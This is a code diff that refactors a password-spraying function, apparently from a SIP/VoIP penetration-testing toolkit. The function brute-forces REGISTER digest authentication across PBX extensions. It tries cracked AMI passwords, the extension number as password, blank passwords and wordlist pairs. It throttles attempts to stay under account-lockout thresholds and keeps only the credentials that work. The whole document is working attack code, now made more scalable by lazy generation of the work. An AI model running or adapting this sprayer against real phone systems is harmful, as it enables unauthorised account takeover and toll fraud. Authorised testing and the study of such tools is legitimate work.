@@ -2,12 +2,18 @@
 
 REGISTER-based digest auth. Per-extension lockout guard prevents triggering
 PBX account lockout policies that would otherwise burn the engagement.
+
+Memory design: work is generated lazily — only max_workers*2 futures exist
+in memory at any time. The full credential list is never duplicated per
+extension; pairs are yielded on demand and only hits are stored.
 """
 from __future__ import annotations
 
+import concurrent.futures
 import threading
-from concurrent.futures import ThreadPoolExecutor, as_completed
+from concurrent.futures import ThreadPoolExecutor
 from dataclasses import dataclass
+from typing import Generator
 
 from . import sip
 from .utils import RateLimiter, local_ip_for, rand_call_id, rand_tag
@@ -133,41 +139,50 @@ def spray(
     tcp: bool = False,
     use_tls: bool = False,
 ) -> list[CredHit]:
-    """Spray creds across extensions in parallel.
+    """Spray creds across extensions in parallel — bounded memory design.
+
+    Work is generated lazily: only max_workers*2 futures exist at any moment.
+    The credential list is never duplicated per extension in memory.
+    Only successful hits are stored; failed attempts are discarded immediately.
 
     smart_self_password: also try (ext, ext) and (ext, "") — extremely common
-                          on Grandstream/FreePBX where admins forget to change defaults.
-    max_failures_per_ext: stop trying creds against an extension after this
-                          many failures, to avoid triggering PBX lockout policies.
-                          Set to 0 to disable (not recommended on prod targets).
+                         on FreePBX/Grandstream where admins leave defaults.
+    max_failures_per_ext: stop after N failures per extension to avoid lockout.
     """
     local_ip = source_ip if source_ip else local_ip_for(host)
-    results: list[CredHit] = []
-    results_lock = threading.Lock()
+    hits: list[CredHit] = []
     stop_for_ext: dict[str, threading.Event] = {e: threading.Event() for e in extensions}
     fail_counts: dict[str, int] = {e: 0 for e in extensions}
-    fail_lock = threading.Lock()
+    lock = threading.Lock()
 
-    def _pairs_for(ext: str) -> list[tuple[str, str]]:
-        pairs: list[tuple[str, str]] = []
-        if ami_cracked_passwords:
-            for p in ami_cracked_passwords:
-                if p:
-                    pairs.append((ext, p))
-        if smart_self_password:
-            pairs.append((ext, ext))
-            pairs.append((ext, ""))
-        for u, p in cred_pairs:
-            pairs.append((u, p))
-            if u != ext:
-                pairs.append((ext, p))
-        seen: set[tuple[str, str]] = set()
-        deduped: list[tuple[str, str]] = []
-        for pair in pairs:
-            if pair not in seen:
-                seen.add(pair)
-                deduped.append(pair)
-        return deduped
+    def _work_gen() -> Generator[tuple[str, str, str], None, None]:
+        """Yield (ext, username, password) lazily — never builds full list."""
+        for ext in extensions:
+            seen: set[tuple[str, str]] = set()
+
+            def _emit(u: str, p: str):
+                if (u, p) not in seen:
+                    seen.add((u, p))
+                    return (ext, u, p)
+                return None
+
+            # Highest priority: AMI cracked passwords, self-password, blank
+            if ami_cracked_passwords:
+                for p in ami_cracked_passwords:
+                    if p:
+                        item = _emit(ext, p)
+                        if item:
+                            yield item
+            if smart_self_password:
+                for p in (ext, ""):
+                    item = _emit(ext, p)
+                    if item:
+                        yield item
+            # Wordlist: try as-stored username first, then reuse password with ext
+            for u, p in cred_pairs:
+                for candidate in (_emit(u, p), _emit(ext, p) if u != ext else None):
+                    if candidate:
+                        yield candidate
 
     def _attempt(ext: str, u: str, p: str) -> CredHit | None:
         if stop_for_ext[ext].is_set():
@@ -176,38 +191,53 @@ def spray(
                                 timeout=timeout, traffic_log=traffic_log,
                                 tcp=tcp, use_tls=use_tls)
         if not ok and ("429" in ev or "503" in ev):
-            import time as _time
-            _time.sleep(2.0)
-        return CredHit(ext, u, p, ok, ev)
+            import time as _t
+            _t.sleep(2.0)
+        # Return only on success or lockout signal; discard plain misses
+        if ok:
+            return CredHit(ext, u, p, True, ev)
+        return None   # drop failed attempts — no memory accumulation
 
-    # Build the work list
-    work: list[tuple[str, str, str]] = []
-    for ext in extensions:
-        for u, p in _pairs_for(ext):
-            work.append((ext, u, p))
+    # Bounded submission: keep at most max_workers*2 futures in flight
+    WINDOW = max_workers * 2
+    work_iter = _work_gen()
+    active: dict[concurrent.futures.Future, tuple[str, str, str]] = {}
+
+    def _fill(ex: ThreadPoolExecutor) -> None:
+        """Submit new work until the window is full or work is exhausted."""
+        while len(active) < WINDOW:
+            try:
+                e, u, p = next(work_iter)
+                if stop_for_ext[e].is_set():
+                    continue   # skip already-locked extensions without submitting
+                f = ex.submit(_attempt, e, u, p)
+                active[f] = (e, u, p)
+            except StopIteration:
+                break
 
     with ThreadPoolExecutor(max_workers=max_workers) as ex:
-        future_map = {ex.submit(_attempt, e, u, p): (e, u, p)
-                      for e, u, p in work}
-        for fut in as_completed(future_map):
-            ext, _, _ = future_map[fut]
-            try:
-                hit = fut.result()
-            except Exception:
-                continue
-            if hit is None:
-                continue
-            with results_lock:
-                results.append(hit)
-            if hit.success:
-                if stop_on_first:
-                    stop_for_ext[ext].set()
-            else:
-                if max_failures_per_ext:
-                    with fail_lock:
+        _fill(ex)
+        while active:
+            done, _ = concurrent.futures.wait(
+                active, return_when=concurrent.futures.FIRST_COMPLETED
+            )
+            for fut in done:
+                ext, u, p = active.pop(fut)
+                try:
+                    hit = fut.result()
+                except Exception:
+                    hit = None
+                if hit and hit.success:
+                    hits.append(hit)
+                    if stop_on_first:
+                        stop_for_ext[ext].set()
+                elif hit is None and max_failures_per_ext:
+                    # _attempt returned None = failure; track lockout
+                    with lock:
                         fail_counts[ext] += 1
                         if fail_counts[ext] >= max_failures_per_ext:
                             stop_for_ext[ext].set()
+            _fill(ex)   # refill window after processing completions
 
-    results.sort(key=lambda r: (r.extension, not r.success))
-    return results
+    hits.sort(key=lambda r: r.extension)
+    return hits
